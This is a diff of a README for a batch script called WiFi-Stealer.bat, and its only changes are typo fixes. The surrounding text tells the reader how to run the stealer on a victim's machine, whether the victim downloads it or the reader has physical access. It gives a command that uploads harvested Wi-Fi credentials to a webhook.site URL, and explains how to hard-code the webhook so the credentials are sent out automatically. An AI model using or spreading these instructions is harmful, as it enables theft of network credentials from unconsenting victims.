@@ -30,7 +30,7 @@ Or you can specify a name for the `txt` file (or any file type), type this:
 ```
 
 ### Running the program on the target machine
-Usually when running the program of a remote machine (program downloaded and executed by the victim) or a machine that you gained phisical access to, you need a way to retrieve the credentials. This is how you do it:
+Usually when running the program on a remote machine (program downloaded and executed by the victim) or on a machine that you gained physical access to, you need a way to retrieve the credentials. This is how you do it:
 
 - **Specify the webhook as an argument**: Simply run the program and pass the URL of your webhook as an argument:
 
@@ -38,7 +38,7 @@ Usually when running the program of a remote machine (program downloaded and exe
 > WiFi-Stealer.bat --upload "https://webhook.site/#!/87258b74-93c5-4792-8175-df08c3ffee20"
 ```
 
-- **Store the webhook inside the program**: If you can't run the program from the command prompt or to avoid typing the url, ensure to save your webhook's URL in the variable `webhook` within the program. Another important step is to change the value of the `upload` variable from `0` to `1`. Once the program is executed, you will receive the credentials.
+- **Store the webhook inside the program**: If you can't run the program from the command prompt (or to avoid typing the url), ensure to save your webhook's URL in the variable `webhook` within the program. Another important step is to change the value of the `upload` variable from `0` to `1`. Once the program is executed, you will receive the credentials.
 
 ```batch
 set upload=0
